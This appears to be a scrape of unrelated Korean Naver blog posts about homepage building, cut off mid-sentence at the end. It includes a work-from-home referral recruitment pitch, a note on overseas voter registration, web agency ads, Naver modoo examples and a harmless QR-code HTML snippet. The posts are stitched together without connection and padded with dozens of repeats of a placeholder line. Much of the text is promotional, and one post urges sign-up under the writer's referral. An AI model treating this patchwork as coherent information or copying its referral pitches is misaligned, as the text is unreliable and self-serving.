시간을​ 3시간 4시간 시간 넘게 들여서도  해볼 만한 포스팅 홍보는 정성 들여 해야 되는 게 정답이겠죠!그러면 어떤 게 해볼 만한 홍보 포스팅이냐?본인이 직접 헬로우드림 포스팅 시간을 할애해 ​써보실​써 보실 때만 느끼는 본인만의 느낌이고,본인의 홍보 구역을 포스팅에서도 찾을 수 있는 방법입니다!​​그러니, 블로그로 헬로우드림 포스팅하여 최적화를 이루려고 하는 분들은 너무 초초하게 생각하지 마시고, 계속 시도해보시고 실패도 해보십시오,,.저도 나름 최적화는 안됐지만 이렇게 블로그 홈페이지 관리한다고 생각하고​ 헬로우드림 포스팅 시간을 투자하니 수익도 나더라고요,블로그는 여러분의 꼭 헬로우드림이 아니더라도,여러분의 자산이 될 수 있으니까 신경 쓰세요~ ​여러분의 빅데이터 저장고이니까요!​​​​ 그럼 이제 화제를 돌려, 집에서 돈 버는 알바 헬로우드림에는 여러분이 재택알바로 수익을 낼 수 있는 방법이 많습니다`!​​ ​ 제가 자주 언급했던 헬로우드림 회원가입(무료)으로 아래와 같은 수익을 낼 수 있고요,,여기에도 포스팅으로 수익 내는 방법이 있습니다~​​ ​ ​ 그리고 저는 히든 옵션이라고 말하고 싶은데^^, 헬로우드림 회원가입(정회원)으로 무료회원가입 보다 더 높은 수익을 올 릴 수도 있습니다.​​ ​​일단 제가 헬로우드림 회원가입 무료로 해보시라고 하는 게 나중에 여러분들이 정회원에 관심 있어 정회원 전환하실 때, 이것이 조금이라도 도움이  되기 때문이에요많이 경험해보고, 본인이 홍보방법도 찾아보고 테스트하고홍보할 공간도 알아가시고다른 회원님들의 글도 보시면서 정보도 얻으시고요!개인 블로그 만들어, 이웃들과도 소통하시고,​그분들의 포스팅하는 방법도 배우시면​ 블로그 홈페이지 관리 도 되면서 자연스럽게 본인이 하는 헬로우드림 포스팅 업무도 재미있어질 것입니다.​여기서, 중요한 것은 집에서 돈 버는 방법을 선택해 재택알바를 하겠다고 생각하시면 실행에 옮겨, 본인이 직접 그 일에 부닥쳐 보는 일입니다.헬로우드림 무료회원가입 꼭 해보시길 바랍니다. ​​ ​블로그도 홈페이지 관리 도 직접 만들어 해보시고 홍보활동해보시며 수익 내시면 ​ 나중에 여러분의 필요로 헬로우드림회원가입(정회원)하실때  지금 하시는 재택알바일이 선행학습이 되는 것이죠!​​ 헬로우드림 무료회원가입은 정회원되기위한 선행학습​  이렇게 무료로 회원가입하여, 홍보활동 배우며 수익 낼 수 있는 방법조차  두려워, 귀찮아  못하시면제가 해드릴 말이 사실 없어요.. ㅜㅜ무언가를 얻기 위해서는 본인이 시도하지 않으면,어떤 것도 이루어지지 않습니다!여러분이 집에서 하는 알바 ​ 헬로우드림에 관심 있으시면 꼭 헬로우드림홈페이지에서 회원가입(무료) 추천합니다!​ 헬로우드림회원가입(무료) 하시기 전 저의 모바일로 전화 주시면 제가 안내도 해드리니 기억해 두시고,​​ 아래는 저 마이웨이의 카카오톡 오픈 채팅방이니 방문하셔서 궁금하신 거 있으시면  주저 마시고 물어보세요!(오픈 카카오톡 채팅방 바로 가기)​그리고 ,헬로우드림회원가입시 홍보마케터 이름이랑 번호를 적는 다소 이상하게 생각하실 수 있는 공간이 있습니다.​이 부분은 여러분이 헬로우드림으로 더 나은 수익을 올리시길 원하셔서 정회원 전환시에 여러분에게 도움드릴 수 있는 도우미,일명 헬로우드림추천인이라고도 하는데요그분들의 정보를 적어두는 공간입니다.​​ 여러분들과 헬로우드림 추천인은 멘토, 멘티로서 서로 윈윈하는 관계라 생각하시면 됩니다​​​아래와 같이 홍보마케터 이름과 번호가 돼있으면 제가 여러분의 헬로우드림 추천인, 도우미가 되어 도와드린다는 뜻과 같으니 기억해두세요​​ ​여러분의 헬로우드림 정회원 시작 시 여러분의 홍보방법, 방향 등을 헬로우드림추천인 아니 선배로서 도움드리니 기억해두시면, 제가 최대한 여러분의 헬로우드림 수익 향상을 위해 도와 드릴 겁니다.제가 여기서 헬로우드림 더 자세히 설명 못드린부분 이해해주시고,더욱 자세한 헬로우드림 내용 알고 싶으시면 저의 블로그 포스팅 ,공지글 확인하시면 도움되실 겁니다!마지막으로,여러분들 뜻깊은 추석 명절 보내시고, 안전 운행하세요^^모두 자신감 가지시고 ,화이팅 하세요!(헬로우드림 무료 회원가입하기/ 헬로우드림 홈페이지 방문)헬로우드림 마이웨이네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가​중앙선거관리위원회 (https://ova.nec.go.kr/cmn/main.do) 홈페이지에 가보면, 외국에 거주하는 한국인의 올해 총선 투표에 관한 사항이 안내되어 있다. 대한민국에 주민등록이나 국내거소신고가 되어 있는 사람은 '국외부재자'이고, 주민등록과 국내거소신고 어느 것도 되어있지 않은 국민은 '재외선거인'이다. 무슨 말이냐..  거주국가 영주권 유무 여부와 상관없이, 한국 주민등록번호가 말소되지 않았으면 국외부재자, 말소되었으면 재외선거자란 말이다.  (참고로, 누군가 이미 주민등록 번호가 없어졌더라도 한국국적이 없어진 건 아니다.) ​​홈페이지 우측 하단 '국외부재자 신고하기'를 누르고, 이름과 생년월일, 이메일 주소를 입력하면 바로 인증이메일이 도착한다. 요렇게 생긴.. 푸른 바탕의 인증하기를 누르고 나면 끝. 신청하기는 했는데 이거 태국대사관까지 가야하나 말아야 하나.. 쩝. 네이버 블로그는 맞지만, 확인불가  ​메이크홈즈 읽어두면 꼭 써먹는 홈페이지 제작 및 관리 핵심 노트어디에서도 가르쳐주지 않는 쇼핑몰 홈페이지 제작 관련 알짜 정보   하루 종일 우리에게 주어지는 시간은 정해져 있어요. 그렇지만 이것을 어떻게 쓰느냐는 사람마다 다르죠.버려진 시간을 아깝게 여기고, 하루하루를 내가 가진 무엇으로 차곡차곡 채우는 것이 중요합니다.홈페이지 제작 및 관리 핵심 정보를 학습하며 하루를 뜻깊게 보내보세요. 하루의 시작이 달라진답니다.   인터넷 이용자 수가 4천만을 넘어선 만큼, 인터넷은 아주 일반화되었다고 봐도 과언이 아닙니다.온라인 쇼핑이나 소셜커머스 등, e 비즈니스 시장은 매년 큰 폭으로 성장하는 상황입니다.​   이렇게 시장성이 큰 온라인 시장에 뛰어들기로 계획한 이상, 가장 먼저 진행해야 하는 부분이 바로 홈페이지를 제작하는 것입니다.​홈페이지는 온라인상에서 만날 수 있는 고객들의 시선을 끌어당겨, 매출을 키우는 데에 가장 크게 기여하는 필수 요소입니다.​홈페이지 내 견적문의 게시판을 생성해 고객의 문의나 건의를 유동적으로 받을 수 있도록 해야 제대로 된 홈페이지 관리가 이루어진 것이랍니다.   그리고 쇼핑몰 홈페이지를 만들 때는, 브랜드를 중점적으로 노출해서 신뢰도를 높이고 쇼핑몰 기능을 통해 전환까지 연결되도록 만들어야 합니다.​​   ​   홈페이지 플래시 관련 지식, 얕게 알고 있었다면? 시크릿 정보 대방출!   ​최근에는 정적인 홈페이지보다 동적인 인터넷 사이트에 관한 인기가 높아지고 있습니다.예를 들면 기존 스크롤 형식이 아니고 한 페이지 내에서 모든 컨텐츠를 보여준 다음마우스로 원하는 메뉴를 클릭하면 그 컨텐츠로 이동하는 방식 등을 꼽을 수 있어요. ​홈페이지에서 움직이는 그래픽을 연출해주는 프로그램으로 플래시를 꼽을 수 있는데요.플래시를 적절히 사용하시면 더욱 수많은 디자인의 홈페이지를 관리할 수 있습니다.​특이하고 특색 있는 디자인으로 방문자들의 눈과 호기심을 사로잡고 싶으시다면올 플래시 기법으로 사이트를 만드는 것을 추천합니다.​플래시로 홈페이지를 만든다고 해서 무조건 움직이는 디자인을 구현해야 하는 것은 아닙니다. 정적이고 심플하며 군더더기 없이 단정한 디자인도 가능하므로플래시로 더 전문적이고 최고급의 디자인도 구현이 가능합니다.   오히려 과도하게 이미지나 동영상을 활용하게 되면, 화면은 화려해질 수 있으나 속도가 느려질 위험이 있으니 신중하게 생각해야 해요.​​   ​우리 가게를 더 쉽게, 더 효율적으로 홍보하는 방법! 제2의 집인 홈페이지를 제작하세요!비교 불가능한 퀄리티의 로고와 홈페이지를 제작해주는 메이크홈즈가 돕겠습니다!   업체의 상품과 서비스를 철저히 분석해 더 보기 쉽게, 더 흥미가 일도록 제작해주는 곳!인스타그램 등 SNS를 활용한 다양한 광고 마케팅도 시행해 홍보효과를 2배로 높여주는 곳!​퀄리티 대비 정직하고 부담 낮은 견적으로 고객님의 마케팅 비용은 줄여주고!신속 정확한 일처리 및 원활한 피드백으로 홈페이지 제작 및 광고마케팅 만족도는 높여주고!​지금 메이크홈즈에 문의하셔서 우리 업체를 더 많은 사람들이 볼 수 있게 해 보세요!초부득삼이라는 사자성어, 들어보신 적 있나요? 처음에 실패를 한다면 세 번째에는 성공한다는 뜻인데요. 오늘 저와 같이 알아본 홈페이지 제작 및 관리 연관 상식처럼 여러분에게 성공을 안겨주길 바라며, 다음에는 더 유익한 정보로 돌아올게요!​​​​   네이버 블로그는 맞지만, 확인불가2. 관리하기에 편한 도구를 사용해 정보를 잘 정리해 보여주기 (네이버모두 홈페이지)​​저는 진정성을 가지어 이웃을 돕는 분과 단체를 좋아합니다. 그리고 가급적 전문성과 짜임새를 갖추어 돕는 일을 하는 곳에 힘을 보태려 합니다.​그래야 그 돕는 일에 관계된 모든 분 예를 들어 '돕는 사람, 도움을 받는 사람, 도움을 주고받는 상황을 보는 사람 모두에게 좋은 것이 더 잘 더해지기 때문' 입니다.​​이전 글에서 오래도록 돕는 일을 해나가는 기관은 보통 함께 알아야 하는 것이 잘 기록이 되어 정리가 되어 있다고 말씀을 드렸습니다.​이때 단순히 기록을 해 쌓아가는 것이 다가 아닌 주제별로 나누어 잘 분류를 해 더해가는 것이 필요한데요.​이래야 쌓는 것은 그 더해지는 양에 비례해 긍정적인 영향을 하는 일에 주어요. 그런데 이렇게​• 잘 분류를 해.• 보기좋게 적절히 표현하여.​인터넷 서비스를 만들어 활용하는 것에 어려움을 느끼시는 분들이 많아 제가 '네이버 modoo!' 를 사용해 만든 예시를 공유 드립니다.​​아래의 주소를 입력하시면 직접 들어가 살펴보실 수도 있어요.​1. 아빠의 품 [아빠의 품 - 홈] 도움이 필요한 미혼 한부모가정을 지원합니다.세상에서 제일 좋은 아빠의 품. 김지환 대표 운영apum.modoo.at ​2. 커넥트 픽쳐스 [커넥트 픽쳐스 - 커넥트 픽쳐스] 영혼의 울림이 있는 영화를 소개합니다.영화 교회오빠, 귀향, 폴란드로 간 아이들 배급사connectpictures.modoo.at ​3. 한국금융범죄예방연구센터 [한국금융범죄예방연구센터 - 홈] 사기범은 당신의 통장과 핸드폰, 돈을 노리고 있습니다.사기범은 당신의 통장과 핸드폰, 돈을 노리고 있습니다.kfcccenter.modoo.at ​4. 알바트로스 우리말센터 [알바트로스 우리말센터 - 홈] 누구나 쉽고 재미있게 한국어 배우기누구나 쉽고 재미있게 한국어 배우기albatrosskr.modoo.at ​​이렇게 진행한 주요 사례들을 보여드리고 생각을 나누는 이유는 '선한 영향력을 주는 일의 지속가능한 상황을 함께 만들고 싶기 때문' 입니다.​언제나 세상에 선함을 더하는 일들이 많아지기를 바라기에, 보시고 공감이 되시면 잘 하시는 일에 적용을 해보시기를 권유 드립니다.​그리고 오래도록 선함의 일을 하며 많은 분들과 행복 속에서 살아가시기를 기도 드립니다.​- 김 상 종 드림 -​​     ​​#아빠의품 #커넥트픽쳐스 #한국금융범죄예방연구센터 #알바트로스우리말센터 #네이버모두 #modoo #홈페이지 #메뉴 #체계화 #짜임새 #축적 #깊이 #전문성 #선한영향력 #지속가능성 #희망 #행복 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가홈페이지+수업관리 프로그램 LMS (화상영어 전화영어 창업 2단계)▲ 홈페이지 샘플▲ 홈페이지 샘플▲ 홈페이지 샘플 전화영어 화상영어 창업을 위한 2단계로 홈페이지와 수업관리 프로그램을 준비해야 합니다.ㅇ홈페이지에는 기본적으로 아래 사항이 포함되어야 합니다.- 회사소개 페이지- 커리큘럼- 레벨테스트- 수강료 안내 및 수강신청- 커뮤니티 게시판(공지사항, FAQ, 문의게시판)ㅇ또한 홈페이지 수강료 부분에서 결제를 위한 카드결제 프로그램을 등록, 회사통장 개설이 필요합니다.카드결제 프로그램은 결제 프로그램 업체(PG사)에서 홈페이지 심사 후 승인해 주기 때문에 홈페이지 제작 완료 후신청이 가능합니다. 심사기간은 약 일주일 소요 되며 비용은 39만원의 등록비가 발생합니다.(등록비 30만/의무 보증보험 9만원)카드결제 프로그램은 설치하는 것이 권장되나, 창업을 위한 의무사항은 아니므로 사업을 개시하고 고객이 늘어가는시점에서 추가하는 방법도 초기 창업비용을 줄이는 방법입니다.- 결제 프로그램 등록 안내 : http://www.allthegate.com/ags/app/app_02.jsp회사통장은 사업자등록증을 지참하여 희망하시는 은행별로 개설하시면 됩니다.기업통장이 있어야 추후 통신판매업 신고가 가능하니 사업자 등록증 발급 후 미리 개설해 두시기 바랍니다.ㅇ 수업관리 프로그램은 세 파트로 구분이 됩니다.- 관리자 : 관리자 모드는 수업배정, 강사현황, 학생현황 등의 모든 관리 권한- 수강생 : 수강생 모드는 수강생이 로그인 했을 때 수업등록, 결제, 수업현황 확인, 문의게시판 이용 등의 기능 - 강사 : 강사 모드는 강사가 로그인 했을 때 본인 수업에 대한 정보(수업시간, 수업분수, 교재 등) 확인 기능▲ 관리자 화면 모습입니다. 관리자는 위 페이지에서 수강생들을 관리하게 됩니다.홈페이지/수업관리 프로그램은 비용이 발생하며 자세한 내역은 아래와 같습니다.ㅇ 홈페이지/관리 프로그램 초기 설치비 : 50만원- 홈페이지 저장공간(호스팅)+도메인(홈페이지 주소)+홈페이지 제작+프로그램 설치ㅇ 기타비용- 수업관리 프로그램 사용료(월 5만원) ; 월 사용료 없는 라이센스 형태로도 구매가능(100만원)- 호스팅/도메인 비용 (년 5만원)※ 수업관리 프로그램은 협력업체인 아이티맵의 프로그램을 사용하며 아래 링크를 통해 체험이 가능합니다.- 수업관리 프로그램 체험하기 : http://www.itmap.co.kr/lms/demo.asp- 아이티맵의 프로그램은 초보 관리자도 쉽게 기능을 배울 수 있어 여러업체에서 사용중인 프로그램 입니다.▲ Simple 버전이 월 이용료 5만원이지만 저희와 함께 하시면 같은 비용으로 Basic 버전으로 업그레이드해서 설치해 드리며월 이용료 없는 라이센스 구매 시 20만원 현금할인이 적용 됩니다.(Basic형태 라이센스 120만원 → 100만원으로 할인)네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가농업법인 마리아의마음에서 운영중인 요한 스테비아 농장의 홈페이지를 만들어 보았습니다.   그동안 찍어놓은 많은 사진 자료들과 동영상들을 간추려서 농장 홈페이지와 홈페이지에 사용할 동영상들은 유튜브 채널을 개설에서 업로드 시켰습니다. ​네이버 모두에서 편리하게 홈페이지를 만들수 있도록 최적화가 되어 있다보니사진자료와 정보가 충분하면 쉽게 만들수가 있겠더라구요. ​https://jesuthadd.modoo.at/ [농업법인마리아의마음 - 홈] 안전한 먹거리로 함께 합니다.요한 스테비아 호두 농장 홈페이지 입니다.jesuthadd.modoo.at ​PC버전과 모바일 버전 모두를 볼수 있게 만들어 주네요 ^^저는 농장이다 보니 처음 만들때 농업쪽 카테고리를 선택하니까모바일 버전도 카테고리에 맞게 자동 세팅이 되었는데제가 임의로 수정을 많이 했습니다.​아래는 모바일 버전의 홈페이지 메인화면입니다. ​ ​​수정하는 것도 그리 어렵지는 않더라구요 ^^아래는 PC버전 홈페이지 메인화면입니다.​ ​​홈페이지라고 하면 만들기가 까다롭고 전문가에게 맡겨야 된다고 생각을 했었는데 우연히 네이버 공지글에서 modoo 모두로 누구나 홈페이지를 쉽게 만들수 있다고 해서 도전을 했었는데 너무 만족스러워서 매일 들어와 업그레이드 중입니다.​모바일로도 수정이 가능하고 PC로도 수정이 가능합니다.  저는 대부분 컴퓨터 작업이 많다보니 PC버전 수정이 더 쉽고 화면이 커서 잘 보이더라구요 ​상단에 홈페이지 관리를 누르고 들어가면 홈페이지를 여러개 만들어 관리할수도 있어서 너무 좋더라구요!!​ ​저같은 초보자도 쉽게 다가갈수 있도록 해놔서 하루는 이것저것 사진도 넣어보고 글도 정리해보고 간단하게 만들었다가 어느 정도 하다보니까 있는 도구들을 활용하기가 쉽다는 걸 알게되서 다음날은 더 다양하게 업로드와 수정을 했답니다 ^^​ ​​이렇게 누구나 쉽게 편집할수 있는 홈페이지가 있다니 너무 좋네요정해진 형태안에 글을 쓰고 사진을 넣는 형태라고 해도사진이나 배치에 따라서는 다른 분위기가 날 듯합니다.​ ​​그제 부터 농장에 가서 작업을 하면서 주변풍경만 시험삼아 동영상을 찍었어요.말주변이 없어서 말은 못하고 조용한 시골 풍경과 농장 풍경만을 담았는데요​홈페이지에 동영상을 업로드 하려니 모두 다른 링크에서 동영상을 가져와야해서 유튜브 계정도 개설을 해서 채널을 만들고 동영상도 업로드 해봤습니다. ^^​ ​​이 동영상들의 링크를 모두 홈페이지에 링크를 걸어서 동영상 페이지도 업데이트 했습니다 ^^​ ​​전 전문가도 아닌데 이렇게 만들고 나니 자신감이 막 올라가네요 ^^너무 신이나서 이것저것 사진도 많이 찍고 영상도 찍고 있는데 서툴다 보니 손이 막 떨려서 동영상이 많이 흔들리더라구요 ^^​그래도 한걸음 한걸음 농장 소식을 함께 전해보려고 합니다.네이버 모두  modoo  가 좋은게 sns 연계하는 탭에 제 블로그 소식도 노출이 된다는 부분이 너무  좋더라구요.​ ​홈페이지는 한번 업로드 해두면 계속 가는 가지만 새로운 소식들을 자주 들려드릴수 있는게 블로그다 보니 블로그 글들이 함께 보여져서 업데이트가 되니 아직은 방문자가 없지만 왠쥐 ~~~ 생동감이 넘쳐서 막 열정이 넘쳐나는 군요 ^^​오늘도 열심히 작업중에 사진작업도 하고 있고 오늘 찍은 제 목소리가 나오는 동영상하나 보여드릴게요 ^^ 유튜브에도 업로드 했고 홈페이지에서도 볼수가 있는데요. 미모사라는 식물의 동영상입니다.​미모사는 손을 대면 잎이 오므라드는 신기한 식물입니다 ^^​https://youtu.be/v_N540_MaK0 ​초보자에게도 편리한 네이버 모두 modoo 홈페이지 만들기,  자영업자들에게도 도움이 될 수 있을 것 같습니다.   감사합니다 ^^​  ​ 네이버 블로그는 맞지만, 확인불가​중소기업은 대체로홈페이지 제작 부서가 없기 때문에주어진 예산에 맞춰서홈페이지 제작 업체를 찾아야 하는데요.​여기서 문제에 봉착합니다.​어떤 기준을 가지고 업체를 선정할 것이냐...입니다.​대부분 홈페이지 제작과는 거리가 먼 분들이업체 컨택을 하기 때문에 더 막막하실 것입니다.​오늘은 수많은 중소기업 홈페이지를제작해 온 저희가 제작 업체 선정 꿀팁을알려드리고자 합니다!​  ​ 자동 반응형 홈페이지로 제작​반응형이라는 말의 의미가 확 와닿지 않으실 텐데요.​간단하게, 자동으로 디바이스 크기에반응하여 크기를 조절하는 홈페이지라고 생각하시면 됩니다ㅎㅎ​요즘 제작되는 홈페이지는 대부분반응형이 기본으로 장착되어 있습니다.​스마트폰을 이용하여 접속하는인구가 많음을 감안한 것이지요.PC버전 홈페이지와 모바일 홈페이지를따로 제작한다면 제작 예산도1.5배~2배 정도 소모되는 데 비해​PC에서 접속하든 모바일로 접속하든접속 환경에 자동으로 반응하는반응형 홈페이지로 제작하는 경우PC버전 홈페이지 제작 비용만 들이면되므로 제작 비용 절감 효과가 있습니다.​단, 업체에 따라서 반응형 적용 시추가 비용을 받을 수도 있기 때문에사전에 반응형 추가 비용이 있는지,반응형 기본 제작이 맞는지 등을꼼꼼하게 확인하시기 바랍니다!​저희 홈페이지제작.kr 포트폴리오를확인하시면 알겠지만,저희 업체는 반응형을 기본으로 제작하며별도 추가 비용이 없습니다^^​​>> 홈페이지제작.kr 포트폴리오 확인하기 <<​  ​ 소스 소유 가능한 독립형​두번째로 살펴봐야 하는 부분은임대형 제작인지, 독립형 제작인지입니다.중소기업 홈페이지는 1~2년 사용하고폐쇄하는 게 아니라,기업이 존속되는 기간 동안 계속유지되는 장기적인 목적의 홈페이지이므로임대형보다는 독립형을 추천드리는데요.​임대형은 디자인이 제한적이고(템플릿 형식)기능 개발이 거의 불가하다는 단점이 있습니다.또한 달마다 유지비용을 내야해서초기 제작 비용이 저렴하다고 하더라도매달 나가는 비용이 1년, 2년 씩 쌓이다보면결코 저렴하다고 보기는 어렵습니다.​독립형은 초기 제작 비용만 지불하면 되고,디자인과 기능 개발이 매우 자유롭습니다.오픈소스형으로 제작된다면추후 유지보수 업체를 교체한다고 해도해당 소스를 사용할 수 있는 개발자가 많기 때문에기능 작업도 충분히 가능합니다.​간혹 독립형으로 제작하는데n년 의무 계약 기간을 두는 업체도 있습니다.이런 곳은 사실 임대형으로 제작하는 곳일 수도 있으니계약을 진행하실 때 작업 완료 후바로 홈페이지 소스 원본을 받을 수 있는지문의해보시기 바랍니다.​저희 업체의 경우 독립형으로 제작하고 있고,제작이 완료되면 유지보수 진행 여부와관계없이 고객이 원하는 경우 홈페이지 원본 소스 및디자인 원본 파일을 제공해드리고 있습니다.​임대형은 소스 분리가 안 되기 때문에이런 원본 소스 파일 제공이 불가합니다.​  ​ 유지보수 여부를 선택할 수 있는 곳​홈페이지 제작이 끝나면그 홈페이지를 관리할 인력이 필요합니다.호스팅 서버도 필요하지요.이런 것을 통틀어 유지보수라고 하는데요.위에서도 말했다시피, 중소기업은 대개홈페이지 관리 인력이 따로 없기 때문에외부 업체에 이를 맡기는 편입니다.그래서 홈페이지 제작 업체가유지보수도 진행하는 경우가 많습니다.​하지만 여기서 중요한 것은유지보수 진행 여부를 고객이 직접선택할 수 있어야 한다는 것입니다.​어떤 경우에는 제작비를 받을 때유지보수 비용을 합산해서 받기도 합니다.이유가 뭘까요?그럼 유지보수까지 자동으로 계약되기 때문입니다.혹은 유지보수는 2, 3년간 의무라는 조항을 넣기도 하지요.이런 게 무조건 나쁘다는 것은 아닙니다.​하지만 제작 과정에서 업체와 잘 맞는지,피드백은 잘 되는지 등을 파악하고이 업체에서 유지보수도 맡겨도 되겠다싶을 때 고객이 직접 선택하는 것이더 만족도가 높은 것은 사실입니다.​저희도 유지보수는 제작이 모두 완료된 뒤에진행 여부를 직접 선택하시라고 안내해드립니다.저희 쪽에서 유지보수를 하지 않으신다면원본 파일을 모두 제공해드리고,진행한다고 하신다면 거기서 또호스팅 관리만 할 것인지, 호스팅과 디자인 관리를함께 할 것인지를 여쭤보는데요.​선택지가 존재하고, 그 중에서 고객이 직접진행 여부나 진행 항목을 선택할 수 있는 업체와진행하시는 게 보다 자유롭고 비용 절감 측면에서도긍정적이라는 것을 강조하고 싶습니다^^​  ​ 제작 업체의 포트폴리오를 확인하세요​제작 업체라면 보통 홈페이지를 가지고 있고,그곳에 제작 결과물, 즉 포트폴리오를 공개합니다.제작 업체의 작업 퀄리티를 확인하는 건필수!과정이라고 할 수 있습니다.만약 포트폴리오를 공개하지 않는 업체라면일단 다른 업체를 먼저 고려하시는 걸 권합니다.​포트폴리오를 확인하는 두 번째 이유는,그 작업 결과물 중에서 참고사이트를 정할 수 있기 때문입니다.제작 문의를 할 때, 막연하게 회사 홈페이지를제작하고 싶습니다. 하기 보다는기준이 되는 사이트를 첨부해서이런 사이트를 만들고 싶다고 한다면제작 업체는 견적을 안내하기 수월하겠지요.​그 참고 사이트가 제작 결과물 중 하나라면더 구체적인 비용 안내가 가능할 것입니다^^​​>> 홈페이지제작.kr 포트폴리오 확인하기 <<​  ​  ​오늘은 중소기업홈페이지제작에 대해 알아보았습니다.오늘 포스팅 내용을 영상으로도 요악했으니시간이 부족한 분들은 영상으로 확인 부탁드립니다^^​  ​ ​저희 홈페이지제작.kr은10년 이상의 제작 노하우로중소기업 홈페이지 제작을진행하고 있습니다.​언제든 상담이 가능하오니메일 또는 유선으로 문의주시기 바랍니다!​ 전국 언제 어디서나홈페이지제작 문의는1661-5668온라인 바로 문의도 가능합니다.http://xn--hu5b4brvf8c73w61d.kr/bbs/write.php?bo_table=consulting 제작상담하기 글쓰기 | 홈페이지제작 is 홈페이지제작.kr홈페이지제작업체, 반응형, 1000여 고객사, 10년이상 노하우,xn--hu5b4brvf8c73w61d.kr ​​ 아이코리아비즈서울특별시 서초구 양재천로23길 23 홍우빌딩 402호 ​ 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가아래 파일은 다음 홈페이지에 가서  - > http://swetake.com/ 에서 다운받은 자료입니다.파일을 다운받으세요..압축을 풀어 보면README-e 파일이 있습니다. 그대로 하시면 됩니다. 아래 샘플도 있습니다.http://swetake.com/qr/sample.html 참고로 d=' '  이렇게 해줘야 우리쪽 서버는 되네요. 다른 분들은 어떻게 했는지 ''없어도 되는지 ...  <HTML><TITLE>홈페이지관리 전문업체 -웹아웃소싱 이지테이크 QR코드 경로입니다.</TITLE> <BODY> fdsafsafafdsa  <img src="http://www.weboutsourcing.co.kr/V1/QR_CODE/php/qr_img.php?d='http://m.eztake.com'&t=J&s=4">  </BODY></HTML>네이버 블로그는 맞지만, 확인불가디지털마케팅 속성과정 교육블로그, 모두홈페이지, 스마트스토어 개설 관리 외에도 다양하고 많은 내용의 교육이 진행됐어요.알찬 교육이었죠.  처음 시작하는 날두둥 긴장하진 않으셨겠죠?서울에서 내려와서 강의해주신 최재현 강사님5일 동안 다니시느라 고생하셨어요^^ 블로그를 개설하고도운영하지 않은 상태로 몇년을 보내다가드디어 운영시작했어요.  이번 교육을 맡은 강사님스펙이 화려하십니다!  2021년도 소띠해의 10대 트렌드창업에 관심 있으신 분은참고하면 좋아요~ 요즘 핫한 인플루언서단계별로 구분되었네요:)  열띤 강의 진행 중이구요모두들 강의에 열중하는 모습오후 시간인데도조는 사람은 단 한명도 없었다는 사실은 안 비밀^^ 블로그에 글을 올리는 것도시간대가 중요하대요.꼭 지킬 수늘 없겠지만참고하면 좋겠죠? 이번 교육은창업과도 관련이 있었는데요​스마트 스토어블로그 마켓인스타그램티스토리등등SNS를 이용한 다양한 마케팅 활용법에 대해 배웠어요.​다음에는 심화과정 약속잊지 않으셨죠?​설문지 답변에도 적었답니다.심화과정 개설 필수!!!  시간이 모자랐어요너무 많은 꿀팁을기억하지 못마면뭔 소용!!!​이렇게 디지털마케팅 속성과정교육 진행된 내용을적어봤습니다^^​  출처는 트위터에서. 불편하시면 삭제하겠습니다.​#디지털마케팅교육 #디지털마케팅속성반 #온라인마케팅 #블로그마켓 #스마트스토어 #모두홈페이지활용 #군산고용지원센터 #젬컴퓨터학원 #속성반 #인플루언서 #디지털마케팅 #강사최재현 #네이버블로그 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가 사람의 뇌는 집중할 때 그 활동력이 좋아진다고 해요~오늘 여러분이 집중했던 일은 무엇인가요? 없었다면 이제부터 저와 함께해요.홈페이지제작및관리에 대한 정보에 열중해서 뇌를 촉진시켜봐요~!  개인 홈페이지 제작을 신청할 때 홈페이지 제작사의 포트폴리오를 검색해 어떤 방식으로 제작해주는지, 디자인 스타일이 내가 생각하고 있는것과 맞는지 등을 파악해 볼 수 있습니다.그리고 개인 홈페이지를 만들 경우에는 누가 어떤 방식으로 만들 것인지를 따져봐야 합니다. 계획하고 있는 제작 시간, 자신의 컴퓨터 사용 능력, 디자인 능력, 예산 등을 모두 고려하여본인이 직접 작업할 것인지 홈페이지 제작사에 위탁을 할 것인지를 선택하여 됩니다.홈페이지 제작하는게 불가능하여 홈페이지 제작업체에 신청을 할 경우에는 업체의 기술적 측면도 뛰어나야 하지만 디자인 감성이 나와 잘 맞는지, 내가 요구하는 바를 정확하게 적용하여 이미지화할 수 있는지도 사전 미팅을 통해 체크해보아야 합니다.또한  제일 먼저 홈페이지의 목적을 정확하게 설정한 뒤 그 목적을 달성하기 위해필요한 정보 즉, 홈페이지 방문자에게 제공되어야 할 내용들을 수집해야 합니다. 개인 홈페이지를 제작할 계획을 세웠다면 홈페이지 제작 툴에 대해서도 살펴보셔야 합니다. 사람들이 가장 많이 활용하는 기본적인 홈페이지 툴로는 워드프레스와 제로보드 XE가 있습니다.홈페이지 제작 완료 후 부족한 부분을 바꿔나가다보면 수정한 부분이 마음에 들지 않아 처음의 상태로 되돌아가고 싶은 경우가 있기 때문에 무조건 백업을 하는 것이 바람직합니다.홈페이지 관리 중 컨텐츠나 페이지를 과실로 지웠을 시를 대비하여 백업 작업은 필수입니다.홈페이지를 명확하게 백업해 두었다면 자유로이 복구가 가능합니다.그리고 사이트에 자료를 등록할 때 별도로 FTP 프로그램을 쓰는데, FTP(File Transfer Protocol)이란, 인터넷 프로그램 중에 한 